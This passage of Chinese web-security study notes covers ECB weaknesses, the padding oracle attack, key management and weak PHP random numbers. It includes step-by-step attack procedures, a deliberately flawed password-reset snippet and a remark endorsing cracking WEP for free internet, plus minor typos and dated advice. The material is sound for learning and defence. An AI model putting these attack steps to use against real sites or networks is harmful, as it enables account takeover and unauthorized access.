- 开始暴破

最终成功破解出WEP的KEY，可以免费蹭网了

#### <font color="yellow">011 ECB模式的缺陷</font>

前面讲到了流密码加密算法中的几种常见的攻击方法，在分组加密算法中，也有一些可能被攻击者利用的地方，如果开发者不熟悉这些问题，就有可能错误地使用加密算法，导致安全隐患，对于分组加密算法来说，除去算法本身，还有一些通用的加密模式，不同的加密算法会支持同样的几种加密模式

常见的加密模式

- ECB
- CBC
- CFB
- OFB
- CTR
- ...

如果加密模式被攻击，那么不论加密算法的密钥有多长，都可能不再安全，ECB模式(电码簿模式)是最简单的一种加密模式，它的每个分组之间相对独立，但ECB模式最大的问题也是出在这种分组的独立性上，攻击者只需要对调任意分组的密文，在经过解密后，所得明文的顺序也是经过对调的3-DES每个分组为8个字节，对比plain加密后的密文，可以看到，仅仅block 1的密文不同，而block 2的密文是完全一样的，也就是说，block 1并未影响到block 2的结果，这与链式加密模式(CBC)等是完全不同的，链式加密模式的分组前后之间会互相关联，一个字节的变化，会导致整个密文发生变化，这一特点也可以用于判断密文是否是用ECB模式加密的，对于ECB模式来说，改变分组密文的顺序，将改变解密后的明文顺序，替换某个分组密文，解密后该对应分组的明文也会被替换，而其他分组不受影响，ECB模式并未完全混淆分组间的关系，因此当分组足够多时，仍然会暴露一些私密信息，而链式模式则避免了此问题，当需要加密的明文多于一个分组的长度时，应该避免使用ECB模式，而使用其他更加安全的加密模式

#### <font color="yellow">012 Padding Oracle Attack</font>

在Eurocrypt 2002 大会上，Vaudenay介绍了针对CBC模式的Padding Oracle Attack，它可以在不知道密钥的情况下，通过对padding bytes的尝试，还原明文，或者构造出任意明文的密文，在2010年的BlackHat欧洲大会上，Juliano Rizzo与Thai Duong介绍了Padding Oracle在实际中的攻击案例[http://net.ifera.com/research/](http://net.ifera.com/research/)，并公布了ASP.NET存在的Padding Oracle问题[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3332](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3332)，在2011年的Pwnie Rewards中，ASP.NET的这个漏洞被评为最具价值的服务器端漏洞[http://pwnies.com/winners](http://pwnies.com/winners)，分组加密算法在实现加/解密时，需要把消息进行分组(block)，block的大小常见的有

- 64bit
- 128bit
- 256bit

在解密完成后，如果最后的padding值不正确，解密程序往往会抛出异常(padding error)，而利用应用的错误回显，攻击者往往可以判断出padding是否正确，所以Padding Oracle实际上是一种边信道攻击，攻击者只需要知道密文的解密结果是否正确即可，而这往往有许多途径，比如在Web应用中，如果是padding不正确，则应用程序很可能会返回500的错误，如果padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误

正确的padding值只可能为

- 1个字节的padding为0x01
- 2个字节的padding为0x02,0x02
- 3个字节的padding为0x03,0x03,0x03
- 4个字节的padding为0x04,0x04,0x04,0x04

因此慢慢调整IV的值，以希望解密后，最后一个字节的值为正确的padding byte，比如一个0x01，因为Intermediary Value是固定的(我们此时不知道Intermediary Value的值是多少)，因此从0x00到0xFF之间，只可能有一个值与Intermediary Value的最后一个字节进行XOR后，结果是0x01，通过遍历这255个值，可以找出IV需要的最后一个字节，通过XOR运算，可以马上推导出此Intermediary Byte的值，在正确匹配了padding为0x01后，需要做的是继续推导出剩下的Intermediary Byte，根据padding的标准，当需要padding两个字节时，其值应该为0x02，0x02，而我们已经知道了最后一个Intermediary Byte为0x3D，因此可以更新IV的第8个字节为0x3D ^ 0x02 = 0x3F，此时可以开始遍历IV的第7个字节(0x00~0xFF)，获得Intermediary Value后，通过与原来的IV进行XOR运算，即可得到明文，在这个过程中仅仅用到了密文和IV，通过对padding的推导，即可还原出明文，而不需要知道密钥是什么，而IV并不需要保密，它往往是以明文形式发送的，如何通过Padding Oracle使得密文能够解密为任意明文呢，实际上通过前面的解密过程可以看出，通过改变IV，可以控制整个解密过程，因此在已经获得了Intermediary Value的情况下，很快就可以通过XOR运算得到可以生成任意明文的IV，而对于多个分组的密文来说，从最后一组密文开始往前推，以两个分组为例，第二个分组使用的IV是第一个分组的密文(cipher text)，因此当推导出第二个分组使用的IV时，将此IV值当做第一个分组的密文，再次进行推导，Brian Holyfield实现了一个叫padbuster的工具，可以自动实施Padding Oracle攻击，[http://bole.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html](http://bole.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)，[http://github.com/GDSSecurity/PadBuster](http://github.com/GDSSecurity/PadBuster)，[http://hi.baidu.com/aullik5/blog/item/7e769d2ec68b2d241f3089ce.html](http://hi.baidu.com/aullik5/blog/item/7e769d2ec68b2d241f3089ce.html)，Padding Oracle Attack的关键在于攻击者能够获知解密的结果是否符合padding，在头现和使用CBC模式的分组加密算法时，注意这一点即可

#### <font color="yellow">013 密钥管理</font>

密码学基本原则：密码系统的安全性应该依赖于密钥的复杂性，而不应该依赖于算法的保密性

在安全领域里，选择一个足够安全的加密算法不是困难的事情，难的是密钥管理，在一些实际的攻击案例中，直接攻击加密算法本身的案例很少，而因为密钥没有妥善管理导致的安全事件却很多，对于攻击者来说，他们不需要正面破解加密算法，如果能够通过一些方法获得密钥，则是件事半功倍的事情，密钥管理中最常见的错误，就是将密钥硬编码在代码里，同样的，将加密密钥、签名的salt等key硬编码在代码中，是非常不好的习惯

硬编码的密钥，在以下几种情况下可能被泄露

- 代码被广泛传播

    这种泄露途径常见于一些开源软件
    有的商业软件并不开源，但编译后的二进制文件被用户下载，也可能被逆向工程反编译后，泄露硬编码的密钥

- 软件开发团队的成员都能查看代码，从而获知硬编码的密钥

    开发团队的成员如果流动性较大，则可能会由此泄露代码

对于第一种情况，如果一定要将密钥硬编码在代码中，我们尚可通过Diffie-Hellman交换密钥体系，生成公私钥来完成密钥的分发，对于第二种情况，则只能通过改善密钥管理来保护密钥，对于Web应用来说，常见的做法是将密钥(包括密码)保存在配置文件或者数据库中，在使用时由程序读出密钥并加载进内存，密钥所在的配置文件或数据库需要严格的控制访问权限，同时也要确保运维或DBA中具有访问权限的人越少越好，在应用发布到生产环境时，需要重新生成新的密钥或密码，以免与测试环境中使用的密钥相同，当黑客已经入侵之后，密钥管理系统也难以保证密钥的安全性，比如攻击者获取了一个webshell，那么攻击者也就具备了应用程序的一切权限，由于正常的应用程序也需要使用密钥，因此对密钥的控制不可能限制住webshell的正常请求，密钥管理的主要目的，还是为了防止密钥从非正常的渠道泄露，定期更换密钥也是一种有效的做法，一个比较安全的密钥管理系统，可以将所有的密钥(包括一些敏感配置文件)都集中保存在一个服务器(集群)上，并通过Web Service的方式提供获取密钥的API，每个Web应用在需要使用密钥时，通过带认证信息的API请求密钥管理系统，动态获取密钥，Web应用不能把密钥写入本地文件中，只加载到内存，这样动态获取密钥最大程度地保护了密钥的私密性，密钥集中管理，降低了系统对于密钥的耦合性，也有利于定期更换密钥

#### <font color="yellow">014 伪随机数问题</font>

伪随机数(pseudo random number)问题——伪随机数不够随机，是程序开发中会出现的一个问题，一方面，大多数开发者对此方面的安全知识有所欠缺，很容易写出不安全的代码，另一方面，伪随机数问题的攻击方式在多数情况下都只存在于理论中，难以证明，因此在说服程序员修补代码时也显得有点理由不够充分，但伪随机数问题是真实存在的、不可忽视的一个安全问题，伪随机数，是通过一些数学算法生成的随机数，并非真正的随机数，密码学上的安全伪随机数应该是不可压缩的，真随机数，则是通过一些物理系统生成的随机数，比如电压的波动、硬盘磁头读/写时的寻道时间、空中电磁波的噪声

##### <font color="yellow">0001 弱伪随机数的麻烦</font>

Luciano Bello发现了Debian上的OpenSSL包中存在弱伪随机数算法，产生这个问题的原因，是由于编译时会产生警告(warning)信息，因此下面的代码被移除了，这直接导致的后果是，在OpenSSL的伪随机数生成算法中，唯一的随机因子是pid，而在Linux系统中，pid的最大值也是32768，这是一个很小的范围，因此可以很快地遍历出所有的随机数，受到影响的有，从2006.9到2008.5.13的debian平台上生成的所有ssh key的个数是有限的，都是可以遍历出来的，这是一个非常严重的漏洞，同时受到影响的还有OpenSSL生成的key以及OpenVPN生成的key，Debian随后公布了这些可以被遍历的key的名单，这次事件的影响很大，也让更多的开发者开始关注伪随机数的安全问题，在Web应用中，使用伪随机数的地方非常广泛，密码、key、SessionID、token等许多非常关键的secret往往都是通过伪随机数算法生成的，如果使用了弱伪随机数算法，则可能会导致非常严重的安全问题

##### <font color="yellow">0002 时间真的随机吗</font>

很多伪随机数算法与系统时间有关，而有的程序员甚至就直接使用系统时间代替随机数的生成，这样生成的随机数，是根据时间顺序增长的，可以从时间上进行预测，从而存在安全隐患，比如下面这段代码，其逻辑是用户取回密码时，会由系统随机生成一个新的密码，并发送到用户邮箱

```php
function sendPSW()
{
    ......
    $messenger = &$this->system->loadModel('system/messenger');echo microtime()."<br/>";
    $passwd = substr(md5(print_r(microtime(),true)),0,6);
    ......
}
```

这个新生成的`$passwd`，是直接调用了`microtime()`后，取其MD5值的前6位，由于MD5算法是单向的哈希函数，因此只需要遍历`microtime()`的值，再按照同样的算法，即可猜解出`$passwd`的值，PHP中的`microtime()`由两个值合并而成，一个是微秒数，一个是系统当前秒数，因此只需要获取到服务器的系统时间，就可以以此时间为基数，按次序递增，即可猜解出新生成的密码，因此这个算法是存在非常严重的设计缺陷的，程序员预想的随机生成密码，其实并未随机，<font color="red">在开发程序时，要切记不要把时间函数当成随机数使用</font>

##### <font color="yellow">0003 破解伪伪随机数算法的种子</font>

在PHP中，常用的随机数生成算法有`mnd()`、`mt_rand()`，可见，`rand()`的范围其实是非常小的，如果使用`rand()`生成的随机数用于一些重要的地方，则会非常危险，其实PHP中的`mt_rand()`也不是很安全，Stefan Esser在他著名的papermt_srand and not so random numbers中提出了PHP的伪随机函数`mt_rand()`在实现上的一些缺陷[http://www.suspekt.org/2008/8/17/mt_srand-and-not-so-ranfom-numbers/](http://www.suspekt.org/2008/8/17/mt_srand-and-not-so-ranfom-numbers/)，伪随机数是由数学算法实现的，它真正随机的地方在于种子(seed)，种子一旦确定后，再通过同一伪随机数算法计算出来的随机数，其值是固定的，多次计算所得值的顺序也是固定的，在PHP4.2.0之前的版本中，是需要通过`srand()`或`mt_srand()`给`rand()`、`mt_rand()`播种的，在PHP 4.2.0之后的版本中不再需要事先通过`srand()`、`mt_srand()`播种，比如直接调用`mt_rand()`，系统会自动播种，在PHP 4.2.0之后的版本中，如果没有通过播种函数指定seed，而直接调用`mt_rand()`，则系统会分配一个默认的种子，在32位系统上默认的播种的种子最大值是2^32，因此最多只需要尝试2^32次就可以破解seed，可以看出，当seed确定时，第一次到第n次通过`mt_rand()`产生的值都没有发生变化

建立在这个基础上，就可以得到一种可行的攻击方式

- 通过一些方法猜解出种子的值
- 通过`mt_srand()`对猜解出的种子值进行播种
- 通过还原程序逻辑，计算出对应的mt_rand()产生的伪随机数的值

需要注意的是，在PHP 5.2.1及其之后的版本中调整了随机数的生成算法，但强度未变，因此在实施猜解种子时，需要在对应的PHP版本中运行猜解程序，在Stefan Esser的文中还提到了一个小技巧，可以通过发送Keep-Alive HTTP头，迫使服务器端使用同一PHP进程响应请求，而在该PHP进程中，随机数在使用时只会在一开始播种一次，在一个Web应用中，有很多地方都可以获取到随机数，从而提供猜解种子的可能，Stefan Esser提供了一种Cross Application Attacks的思路，即通过前一个应用在页面上返回的随机数值，猜解出其他应用生成的随机数值，如果服务器端将`$search_id`返回到页面上，则攻击者就可能猜解出当前的种子，这种攻击确实可行，比如一个服务器上同时安装了WordPress与phpBB,可以通过phpBB猜解出种子，然后利用WordPress的密码取回功能猜解出新生成的密码

Stefan Esser描述这个攻击过程如下

- 使用Keep-Alive HTTP请求在phpBB2论坛中搜索字符串`'a'`
- 搜索必然会出来很多结果，同时也泄露了`search_id`
- 很容易通过该值猜解出随机数的种子
- 攻击者仍然使用Keep-Alive HTTP头发送一个重置admin密码的请求给WordPress blog
- WordPress `mt_rand()`生成确认链接，并发送到管理员邮箱
- 攻击者根据已算出的种子，可以构造出此确认链接
- 攻击者确认此链接(仍然使用Keep-Alive头)，WordPress将向管理员邮箱发送新生成的密码
- 因为新密码也是由mt_rand()生成的，攻击者仍然可以计算出来
- 从而攻击者最终获取了新的管理员密码

##### <font color="yellow">0004 使用安全的随机数</font>

我们需要谨记，在重要或敏感的系统中，一定要使用足够强壮的随机数生成算法，在Java中，可以使用`java.security.SecureRandom`，而在Linux中，可以使用`/dev/random`或者`/dev/urandom`来生成随机数，只需要读取即可，而在PHP 5.3.0及其之后的版本中，若是支持openSSL扩展，也可以直接使用函数来生成随机数，除了以上方法外，从算法上还可以通过多个随机数的组合，以增加随机数的复杂性，比如通过给随机数使用MD5算法后，再连接一个随机字符，然后再使用MD5算法一次，这些方法，也将极大地增加攻击的难度

#### <font color="yellow">015 总结</font>

在加密算法的选择和使用上，有以下最佳实践

- 不要使用ECB模式
- 不要使用流密码(比如RC4)
- 使用HMAC-SHA1代替MD5(甚至是代替SHA1)
- 不要使用相同的key做不同的事情
- salts与IV需要随机产生
- 不要自己实现加密算法，尽量使用安全专家已经实现好的库
- 不要依赖系统的保密性

当你不知道该如何选择时，有以下建议

- 使用CBC模式的AES256用于加密
- 使用HMAC-SHA512用于完整性检查
- 使用带salt的SHA-256 或SHA-512 用于Hashing

### <font color="yellow">06 Web框架安全</font>
































































































